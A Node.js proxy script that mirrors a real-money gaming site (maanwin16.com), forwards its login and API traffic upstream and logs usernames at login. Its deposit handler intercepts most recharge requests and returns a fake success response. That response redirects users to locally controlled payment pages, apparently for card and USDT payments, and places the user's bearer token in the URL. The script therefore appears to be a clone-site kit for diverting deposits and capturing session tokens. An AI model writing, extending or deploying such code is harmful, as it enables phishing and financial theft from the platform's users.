#!/usr/bin/env node
/**
 * Concurrent same-origin static + Maanwin API proxy (tenant 6015).
 */
import http from "node:http";
import https from "node:https";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const PORT = Number(process.env.PORT || process.argv[2] || 8099);
const HOST = "127.0.0.1";
const PAY_PHP_PORT = Number(process.env.PAY_PHP_PORT || 8101);
const UPSTREAM_HOST = "maanwin16.com";
const CHANNEL_ORIGIN = "https://maanwin16.com";

for (const k of [
  "HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy",
  "ALL_PROXY", "all_proxy", "SOCKS_PROXY", "SOCKS5_PROXY",
  "socks_proxy", "socks5_proxy",
]) {
  delete process.env[k];
}
process.env.NO_PROXY = "*";
process.env.no_proxy = "*";

const MIMES = {
  ".html": "text/html; charset=UTF-8",
  ".js": "application/javascript; charset=UTF-8",
  ".mjs": "application/javascript; charset=UTF-8",
  ".css": "text/css; charset=UTF-8",
  ".json": "application/json; charset=UTF-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".webp": "image/webp",
  ".webmanifest": "application/manifest+json",
  ".ico": "image/x-icon",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".map": "application/json",
  ".txt": "text/plain; charset=UTF-8",
  ".php": "application/javascript; charset=UTF-8",
};

function safeJoin(root, urlPath) {
  const decoded = decodeURIComponent(urlPath.split("?")[0] || "/");
  const rel = decoded.replace(/^\/+/, "");
  const abs = path.normalize(path.join(root, rel));
  if (!abs.startsWith(root)) return null;
  return abs;
}

function send(res, status, headers, body) {
  res.writeHead(status, headers);
  res.end(body);
}

function noStore(extra = {}) {
  return {
    "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
    Pragma: "no-cache",
    Expires: "0",
    ...extra,
  };
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

function safeLoginLog(pathname, rawBody, upstreamStatus, respText) {
  if (!/\/api\/Home\/Login(?:\/|$)/i.test(pathname)) return;
  let username = "";
  let phonetype = "";
  let logintype = "";
  let pwdLen = 0;
  try {
    const j = JSON.parse(rawBody.toString("utf8") || "{}");
    username = String(j.userName || j.username || "");
    phonetype = j.areaCode || j.phonetype;
    logintype = j.loginType || j.logintype || "";
    pwdLen = String(j.password || j.pwd || "").length;
  } catch {}
  let msgCode = "";
  let code = "";
  try {
    const j = JSON.parse(respText || "{}");
    msgCode = j.msgCode;
    code = j.code;
  } catch {}
  console.log(
    `[login] user=${username} type=${logintype} phoneType=${phonetype} pwdLen=${pwdLen} http=${upstreamStatus} code=${code} msgCode=${msgCode}`
  );
}

function proxyPayPhp(req, res, pathname, search) {
  return readBody(req).then((body) => {
    const headers = {};
    for (const [k, v] of Object.entries(req.headers)) {
      if (!v || k === "host" || k === "connection" || k === "content-length") continue;
      headers[k] = v;
    }
    if (body.length && req.headers["content-type"]) {
      headers["content-type"] = req.headers["content-type"];
    }
    headers.host = `127.0.0.1:${PAY_PHP_PORT}`;
    const up = http.request({
      hostname: "127.0.0.1",
      port: PAY_PHP_PORT,
      path: pathname + (search || ""),
      method: req.method,
      headers,
      timeout: 60000,
    }, (upRes) => {
      const out = { ...upRes.headers };
      delete out.connection;
      delete out["transfer-encoding"];
      res.writeHead(upRes.statusCode || 200, out);
      upRes.pipe(res);
    });
    up.on("timeout", () => up.destroy(new Error("pay php timeout")));
    up.on("error", (err) => {
      console.error("[pay-php]", pathname, err.message);
      send(res, 502, { "Content-Type": "text/html; charset=UTF-8" },
        "<p>Payment server unavailable. Restart ./start-local.sh</p>");
    });
    if (body.length) up.write(body);
    up.end();
  });
}

const CREATE_PAY_EPS = [
  "DepositRecharge",
  "GoodsDepositRecharge",
];

function matchCreatePayEp(pathname) {
  const path = String(pathname || "").split("?")[0];
  if (path.endsWith("/CreateRechargeOrderAppeal")) return null;
  for (const name of CREATE_PAY_EPS) {
    if (path.endsWith("/" + name)) return name;
  }
  return null;
}

function parseJsonBody(buf) {
  try {
    return JSON.parse(buf.toString("utf8") || "{}");
  } catch {
    return {};
  }
}

const usdtCategoryIds = new Set(["400146"]);
const arpayCategoryIds = new Set(["400147"]);

function cacheCategoryIds(payload) {
  const list = payload && payload.data;
  if (!Array.isArray(list)) return;
  for (const row of list) {
    const id = String((row && (row.id ?? row.Id)) || "");
    if (!id) continue;
    const t = String((row && row.rechargeType) || "").toLowerCase();
    const n = String((row && row.name) || "").toLowerCase();
    if (t === "usdt" || n.includes("usdt")) usdtCategoryIds.add(id);
    if (t === "arpay" || n.includes("arpay")) arpayCategoryIds.add(id);
  }
}

function categoryIdFromBody(body) {
  return String(body.rechargeCategoryId || body.payTypeId || body.payTypeID || body.tyid || "");
}

function isUsdtPay(body) {
  const cat = categoryIdFromBody(body);
  if (cat && usdtCategoryIds.has(cat)) return true;
  const payId = Number(body.payId || body.payID || 0);
  if (payId === 11 || payId === 16 || payId === 19) return true;
  const s = JSON.stringify(body || {}).toLowerCase();
  return s.includes("usdt") || s.includes("crypto") || s.includes("trc20");
}

function isArPay(body) {
  const cat = categoryIdFromBody(body);
  if (cat && arpayCategoryIds.has(cat)) return true;
  const s = JSON.stringify(body || {}).toLowerCase();
  return s.includes("arpay");
}

function jwtUserId(authHeader) {
  const t = String(authHeader || "").replace(/^Bearer\s+/i, "").trim();
  if (!t || t.indexOf(".") < 0) return "0";
  try {
    let s = t.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    const payload = JSON.parse(Buffer.from(s, "base64").toString("utf8") || "{}");
    return String(payload.UserId || payload.userId || payload.userid || payload.id || payload.Id || "0");
  } catch {
    return "0";
  }
}

function nowIso() {
  try {
    return new Date().toISOString().replace("T", " ").slice(0, 19);
  } catch {
    return "";
  }
}

function payStubPayload(amount, authHeader, { usdt = false, tyid = "" } = {}) {
  const uid = jwtUserId(authHeader);
  const tok = String(authHeader || "").replace(/^Bearer\s+/i, "").trim();
  const a = amount && Number(amount) > 0 ? Number(amount).toFixed(2) : (usdt ? "10.00" : "200.00");
  const path = usdt ? "/pay/usdt.php" : "/pay/rhinopay.php";
  const channel = usdt ? "USDT-NoBonus" : "Rhinopay";
  let redirectUrl = `${path}?amount=${encodeURIComponent(a)}&uid=${encodeURIComponent(uid)}&token=${encodeURIComponent(tok)}&channel=${encodeURIComponent(channel)}`;
  if (tyid) redirectUrl += `&tyid=${encodeURIComponent(tyid)}`;
  return {
    data: {
      scanCodePay: false,
      formBody: null,
      formUrl: "",
      redirectUrl,
      submitType: 1,
      submitUrl: "",
      orderResult: 1,
      rechargeChannelId: 1,
      onGoingOrder: {},
      addThirdPayOrderRsp: null,
      orderNo: null,
    },
    code: 0,
    msg: "Succeed",
    msgCode: 0,
    serverTime: Date.now(),
    serviceNowTime: nowIso(),
  };
}

function proxyApi(req, res, pathname, search) {
  return readBody(req).then((body) => {
    const ep = matchCreatePayEp(pathname);
    if (ep) {
      const json = parseJsonBody(body);
      if (!isArPay(json)) {
        const usdt = isUsdtPay(json);
        const payload = payStubPayload(json.amount, req.headers.authorization, {
          usdt,
          tyid: categoryIdFromBody(json),
        });
        console.log("[pay-block]", ep, usdt ? "usdt" : "rhinopay", "amount=", json.amount, "uid=", jwtUserId(req.headers.authorization));
        send(res, 200, noStore({ "Content-Type": "application/json; charset=UTF-8" }), JSON.stringify(payload));
        return;
      }
    }
    if (/\/Recharge\/(GetArUpiOnGoingOrder|ArUpiCancelRechargeOrder)\/?$/.test(pathname)) {
      send(res, 200, noStore({ "Content-Type": "application/json; charset=utf-8" }), JSON.stringify({
        data: null, code: 0, msg: "Succeed", msgCode: 0, serverTime: Date.now(),
      }));
      return;
    }

    const headers = {
      Origin: CHANNEL_ORIGIN,
      Referer: CHANNEL_ORIGIN + "/",
      Host: UPSTREAM_HOST,
    };
    const ct = req.headers["content-type"];
    if (ct) headers["Content-Type"] = ct;
    else if (body.length) headers["Content-Type"] = "application/json;charset=UTF-8";
    const auth = req.headers.authorization;
    if (auth && String(auth).trim() && String(auth).trim() !== "undefined") {
      headers.Authorization = auth;
    }
    if (req.headers["user-agent"]) headers["User-Agent"] = req.headers["user-agent"];
    if (req.headers.accept) headers.Accept = req.headers.accept;
    if (req.headers["accept-language"]) headers["Accept-Language"] = req.headers["accept-language"];

    const opts = {
      protocol: "https:",
      hostname: UPSTREAM_HOST,
      port: 443,
      path: pathname + (search || ""),
      method: req.method,
      headers,
      family: 4,
      timeout: 45000,
    };

    const up = https.request(opts, (upRes) => {
      const chunks = [];
      upRes.on("data", (c) => chunks.push(c));
      upRes.on("end", () => {
        const buf = Buffer.concat(chunks);
        const text = buf.toString("utf8");
        safeLoginLog(pathname, body, upRes.statusCode, text);
        if (/\/Recharge\/GetRechargeCategoryList\/?$/.test(pathname)) {
          try { cacheCategoryIds(JSON.parse(text)); } catch {}
        }
        const out = {
          "Content-Type": upRes.headers["content-type"] || "application/json; charset=utf-8",
        };
        send(res, upRes.statusCode || 200, out, buf);
      });
    });
    up.on("timeout", () => up.destroy(new Error("upstream timeout")));
    up.on("error", (err) => {
      console.error("[proxy]", pathname, err.message);
      safeLoginLog(pathname, body, 502, '{"msg":"ProxyError"}');
      send(res, 502, { "Content-Type": "application/json; charset=UTF-8" }, JSON.stringify({
        code: 1,
        msgCode: 1,
        msg: "ProxyError",
        data: null,
      }));
    });
    if (body.length) up.write(body);
    up.end();
  });
}

function proxyImg(req, res, pathname) {
  const rest = pathname.replace(/^\/img\//, "");
  if (!rest || rest.includes("..")) {
    send(res, 400, { "Content-Type": "text/plain" }, "Bad path");
    return Promise.resolve();
  }
  const targets = [
    { hostname: "pro-img.arsaaspub.com", path: "/" + rest },
    { hostname: "maanwin16.com", path: "/img/" + rest },
  ];

  const tryOne = (i) => new Promise((resolve) => {
    if (i >= targets.length) {
      send(res, 404, { "Content-Type": "text/plain" }, "Not found");
      resolve();
      return;
    }
    const t = targets[i];
    const up = https.request({
      protocol: "https:",
      hostname: t.hostname,
      port: 443,
      path: t.path,
      method: "GET",
      headers: {
        Accept: "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0",
      },
      family: 4,
      timeout: 25000,
    }, (upRes) => {
      const chunks = [];
      upRes.on("data", (c) => chunks.push(c));
      upRes.on("end", () => {
        const buf = Buffer.concat(chunks);
        const status = upRes.statusCode || 0;
        const ct = String(upRes.headers["content-type"] || "");
        if (status < 200 || status >= 300 || !buf.length || ct.includes("text/html") || ct.includes("application/json")) {
          tryOne(i + 1).then(resolve);
          return;
        }
        send(res, status, {
          "Content-Type": ct || "image/webp",
          "Cache-Control": "public, max-age=86400",
          "Access-Control-Allow-Origin": "*",
        }, buf);
        resolve();
      });
    });
    up.on("timeout", () => up.destroy(new Error("img timeout")));
    up.on("error", () => { tryOne(i + 1).then(resolve); });
    up.end();
  });

  return tryOne(0);
}

function serveFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const type = MIMES[ext] || "application/octet-stream";
  const headers = [".js", ".css", ".html"].includes(ext) ? noStore({ "Content-Type": type }) : { "Content-Type": type };
  res.writeHead(200, headers);
  fs.createReadStream(filePath)
    .on("error", () => {
      if (!res.writableEnded) res.end();
    })
    .pipe(res);
}

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url || "/", `http://${HOST}:${PORT}`);
    let pathname = url.pathname || "/";

    if (pathname === "/web/config" || pathname === "/web/config/" || pathname === "/web/config.php") {
      const cfg = path.join(ROOT, "web", "config.html");
      send(res, 200, noStore({ "Content-Type": "application/javascript; charset=UTF-8" }), fs.readFileSync(cfg));
      return;
    }

    if (/^\/pay(\/|$)/.test(pathname)) {
      await proxyPayPhp(req, res, pathname, url.search);
      return;
    }

    if (/^\/api(\/|$)/.test(pathname)) {
      await proxyApi(req, res, pathname, url.search);
      return;
    }

    if (/^\/img\//.test(pathname)) {
      const absImg = safeJoin(ROOT, pathname);
      if (absImg && fs.existsSync(absImg) && fs.statSync(absImg).isFile()) {
        serveFile(res, absImg);
        return;
      }
      await proxyImg(req, res, pathname);
      return;
    }

    if (pathname === "/") {
      send(res, 200, noStore({ "Content-Type": "text/html; charset=UTF-8" }), fs.readFileSync(path.join(ROOT, "index.html")));
      return;
    }

    const abs = safeJoin(ROOT, pathname);
    if (abs && fs.existsSync(abs) && fs.statSync(abs).isFile()) {
      serveFile(res, abs);
      return;
    }
    if (abs && fs.existsSync(abs) && fs.statSync(abs).isDirectory()) {
      for (const idx of ["index.html", "index.php"]) {
        const cand = path.join(abs, idx);
        if (fs.existsSync(cand) && fs.statSync(cand).isFile()) {
          serveFile(res, cand);
          return;
        }
      }
    }

    if (/^\/(assets|css|js|img|images|webapi)(\/|$)/.test(pathname)) {
      send(res, 404, { "Content-Type": "text/plain; charset=UTF-8" }, "Not found");
      return;
    }

    send(res, 200, noStore({ "Content-Type": "text/html; charset=UTF-8" }), fs.readFileSync(path.join(ROOT, "index.html")));
  } catch (err) {
    console.error("[server]", err);
    if (!res.headersSent) send(res, 500, { "Content-Type": "text/plain" }, "Server error");
  }
});

server.listen(PORT, HOST, () => {
  console.log(`Starting http://${HOST}:${PORT} (concurrent Node proxy, no php -S)`);
});
